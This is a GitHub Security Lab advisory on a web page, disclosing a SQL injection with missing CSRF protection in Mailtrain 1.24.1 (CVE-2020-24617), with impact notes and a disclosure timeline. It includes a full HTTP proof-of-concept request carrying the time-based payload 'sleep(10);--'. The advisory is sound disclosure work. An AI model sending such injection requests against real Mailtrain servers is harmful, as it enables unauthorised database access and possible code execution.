<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">September 9, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-132: SQL Injection in Mailtrain - CVE-2020-24617</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>SQL injection and missing <a href="https://owasp.org/www-community/attacks/csrf">CSRF</a> protection may lead to Remote Code Execution (RCE) or arbitrary file read.</p>

<h2 id="product">Product</h2>
<p>Mailtrain</p>

<h2 id="tested-version">Tested Version</h2>
<p>1.24.1</p>

<h2 id="details">Details</h2>

<h3 id="sql-injection-in-statsclickedsubscribersbycolumn-accessible-from-campaignsclickedajax">SQL injection in <a href="https://github.com/Mailtrain-org/mailtrain/blob/f661ba8a6b5b0114f36bf7256bcc8227917ea363/lib/models/campaigns.js#L64">statsClickedSubscribersByColumn</a> accessible from /campaigns/clicked/ajax</h3>

<p>The user input <code class="language-plaintext highlighter-rouge">column</code> is used without validation to format a SQL query. The following HTTP request triggers SQL injection. Note that the anti Cross Site Request Forgery (CSRF) token is absent. A specially crafted page may use a CSRF vulnerability against a logged-in Mailtrain user to perform the injection even if the attacker doesn’t have credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /campaigns/clicked/ajax/1/gdgdg/stats HTTP/1.1
Host: 192.168.253.133:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: connect.sid=s%3AzxIehz7S0MFY1s3sP_7WxkFE6_yfHN8T.C3jcpEr1Ly1gAAnMRhELS0qiBJgBSCDV4ohkiuo1kj0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

column=sleep(10);--
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to RCE or arbitrary file read. However an important pre-requisite is improperly configured database user settings. If the database user is correctly locked down it still may lead to denial of service or a timing based blind read. Authentication is not needed if the vulnerability is chained with CSRF.</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2020-24617</li>
</ul>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>07/07/2020: Report sent to Vendor</li>
  <li>21/07/2020: No reply. Asking for confirmation</li>
  <li>21/07/2020: Vendor acknowledges that the SQL injection part was fixed on 13/07/2020</li>
  <li>25/08/2020: CVE-2020-24617 assigned</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-132</code> in any communication regarding this issue.</p>

 